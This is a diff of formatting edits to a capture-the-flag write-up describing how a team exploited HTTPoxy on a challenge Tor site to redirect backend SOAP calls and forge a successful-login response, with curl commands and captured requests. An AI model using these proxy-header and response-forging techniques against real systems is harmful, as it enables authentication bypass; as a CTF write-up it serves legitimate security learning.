@@ -32,7 +32,7 @@ Content-Type: text/html; charset=UTF-8
 ```
 
 That PHP version is old and has some known vulnerabilities, furthermore no other PHP challenges had that header exposed so we guessed it was there on purpose.  
-Checking PHP vulnerabilities we spotted the https://httpoxy.org/ and we gave it a shot:
+Checking PHP vulnerabilities we spotted the [HTTPoxy](https://httpoxy.org/) vuln and we gave it a shot:
 
 ```
 $ torsocks curl -I -H 'Proxy: 127.0.0.1:1' https://silkroadzpvwzxxv.onion/ -k
@@ -166,8 +166,8 @@ Content-Length: 574
 <----- Request End -----
 ```
 
-**NOTE**: *during most part of the ctf the /d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php
- andpoint was exposed and usable via the Hidden Service. On a few ours before the end the admin took the decision to disable it from outside usage so while we go the answer schema by querying the server the admins solutions implied to guess the server response schemas based only on fronted requests. As of the writing of this writeup this is indeed the case.*
+**NOTE**: *during most part of the ctf the `/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php`
+ endpoint was exposed and usable via the Hidden Service. On a few ours before the end the admin took the decision to disable it from outside usage so while we got the answer schema by querying the server the admins solutions implied to guess the server response schemas based only on fronted requests. As of the writing of this writeup this is indeed the case.*
 
 ```
  $ torsocks curl -X POST -k https://silkroadzpvwzxxv.onion/d90cdc7988b15060c1896126cee2eae9/hiddenservice_ws.php -H 'Host: hiddenservicehost' -H 'Content-Type: text/xml; charset=utf-8' -H 'SOAPAction: "https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/getCaptchaWord"' --data $'<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="https://hiddenservicehost/d90cdc7988b15060c1896126cee2eae9/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:checkCaptchaWord><guid xsi:nil="true"/><word xsi:type="xsd:string">aKAjuE</word></ns1:checkCaptchaWord></SOAP-ENV:Body></SOAP-ENV:Envelope>'
@@ -272,7 +272,7 @@ Content-Length: 1166
 The data is encrypted using the public key obtained from the previous request so it's trivial to decrypt:
  * username: cleartext username sent in login
  * password: cleartext password sent in login
- * return_format: the string 'LEVEL#|#ACTIVE#|#USERNAME'
+ * return_format: the string `'LEVEL#|#ACTIVE#|#USERNAME'`
 
 
 By letting the client encrypt the data with the original server key we captured an original login request and sent it to the exposed service in order to know how to build the response:
@@ -285,16 +285,16 @@ By letting the client encrypt the data with the original server key we captured 
 And the login page returned the message for the **wrong login/password combination** as we sent random login data.  
 
 At this point we were stuck: since the server sent a public key to the client but not vice versa we couldn't understand how the server response was encrypted.  
-Injection in the username or password fields when directly contacting the backend service was not an option since the fronted wasn't doing any additional sanitization and we already knew it was not vulnerable. We tried some time based payloads guessing that the fields in the return_format string might be column names used in a query without luck.
+**Injection** in the username or password fields when directly contacting the backend service **was not an option** since the fronted wasn't doing any additional sanitization and we already knew it was not vulnerable. We tried some time based payloads guessing that the fields in the return_format string might be column names used in a query without luck.
 Furthermore the admins disabled the public version of the service and it stopped responding so we thought the challenge was broken someway.
 
 *This part of the solution was provided by the admins after the challenge as ended.*
 
-It turned out the server response was encrypted using the RSA private key and decrypted with the public key the frontend had.  
+It turned out **the server response was encrypted using the RSA private key and decrypted with the public key the frontend had.**  
 After understanding that the final step was to guess a return string for a successful login:
 
- * 1338|true|dpr
- * 9000|1|admin
+ * `1338|true|dpr`
+ * `9000|1|admin`
  * etc
 
 In order to make the challenge solvable some different input/formats were accepted.
@@ -345,7 +345,7 @@ Content-Length: 722
 <----- Request End -----
 ```
 
-The frontend has successfully validated the login as is now trying to retrieve more records for the now logged in user. We can't answer that because we don't have such data but in fact we don't need to. By issuing another request with the same `PHPSESSID` cookie we can see that the previous procedure is skipped and only a `getUserDetails` requests is sent which means that our sessios is now authenticated.
+**The frontend has successfully validated the login** as is now trying to retrieve more records for the now logged in user. We can't answer that because we don't have such data but in fact we don't need to. By issuing another request with the same `PHPSESSID` cookie we can see that the previous procedure is skipped and only a `getUserDetails` requests is sent which means that our sessios is now authenticated.
 
 We should now be able to get the flag:
 
